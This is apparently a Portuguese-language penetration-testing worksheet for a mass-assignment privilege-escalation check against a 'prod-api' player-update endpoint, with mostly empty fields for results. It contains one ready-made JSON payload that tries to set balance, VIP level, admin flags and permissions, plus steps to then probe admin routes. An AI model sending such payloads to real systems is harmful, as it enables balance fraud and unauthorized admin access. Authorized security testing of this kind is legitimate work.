# B7 — Escalada de privilégio via mass assignment

**Endpoint:** `POST /prod-api/player/update`
**Objetivo:** Mandar campos extras (não documentados) e ver se o backend
aceita gravar `isAdmin`, `vipLevel`, `balance` direto.

---

## Request original (update normal de algum campo permitido, ex. nickname)

```
<cola aqui o update normal pra eu ver a estrutura base>
```

```
<response>
```

---

## Payload 1 — Tudo de uma vez

### Request body
```json
{
  "balance": 999999,
  "vipLevel": 99,
  "vip_level": 99,
  "isAdmin": true,
  "is_admin": 1,
  "role": "admin",
  "userType": "admin",
  "type": 1,
  "enable": 1,
  "permissions": ["admin", "superuser"]
}
```

### Response
```
```

### Verificação pós-update
> Faça GET no perfil pelo endpoint normal e cola aqui:
```
GET /prod-api/player/info ou similar
<response>
```

### Algum campo grudou?
- balance:
- vipLevel:
- isAdmin:
- role:
- outros:

---

## Payload 2 — Só `balance`

### Request
```
```

### Response
```
```

### Saldo depois
```
```

---

## Payload 3 — Só `vipLevel`

### Request
```
```

### Response
```
```

---

## Payload 4 — Só `isAdmin: true`

### Request
```
```

### Response
```
```

### Tentou acessar /prod-api/admin/* depois?
```
<resultado>
```

---

## Resumo

- Backend silenciosamente ignora ou retorna erro quando vê campo extra?
- Algum campo aceito?
